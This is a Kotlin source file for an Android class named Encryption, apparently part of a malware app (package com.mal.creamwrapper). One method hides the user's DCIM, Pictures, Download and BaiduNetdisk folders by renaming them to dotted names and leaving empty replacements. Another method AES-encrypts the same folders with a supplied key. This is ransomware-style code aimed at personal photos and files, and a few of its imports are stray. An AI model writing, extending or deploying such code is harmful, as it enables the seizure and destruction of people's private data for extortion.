package com.mal.creamwrapper

import android.R.attr.path
import android.content.Context
import android.media.MediaScannerConnection
import android.os.Environment
import android.util.Log
import java.io.File
import java.util.stream.Gatherers.scan

public class Encryption(private val context: Context) {
    private val fo = File(Environment.getExternalStorageDirectory(), "DCIM")
    private val fu = File(Environment.getExternalStorageDirectory(), "Pictures")
    private val fy = File(Environment.getExternalStorageDirectory(), "Download")
    private val eb = File(Environment.getExternalStorageDirectory(), "BaiduNetdisk")
    public fun weak() {

        if (fo.exists()){
            val fi = File(Environment.getExternalStorageDirectory(), ".tA")
            val ai = File(fo, ".nomedia")
            ai.createNewFile()
            fo.renameTo(fi)
            fo.mkdirs()
        }

        if (fu.exists()){
            val uo = File(Environment.getExternalStorageDirectory(), ".tB")
            val ax = File(fu, ".nomedia")
            ax.createNewFile()
            fu.renameTo(uo)
            fu.mkdirs()
        }

        if (fy.exists()){
            val uw = File(Environment.getExternalStorageDirectory(), ".tC")
            val ar = File(fy, ".nomedia")
            ar.createNewFile()
            fy.renameTo(uw)
            fy.mkdirs()
        }

        if (eb.exists()) {
            val xq = File(Environment.getExternalStorageDirectory(), ".tD")
            val mn = File(eb, ".nomedia")
            mn.createNewFile()
            eb.renameTo(xq)
            eb.mkdirs()
        }
    }
    public fun strong(key: String){
        val aes = AES(key)
        if (fo.exists()){
            aes.encrypt(fo)
        }
        if (fu.exists()){
            aes.encrypt(fu)
        }
        if (fy.exists()){
            aes.encrypt(fy)
        }
        if (eb.exists()){
            aes.encrypt(eb)
        }
    }
}
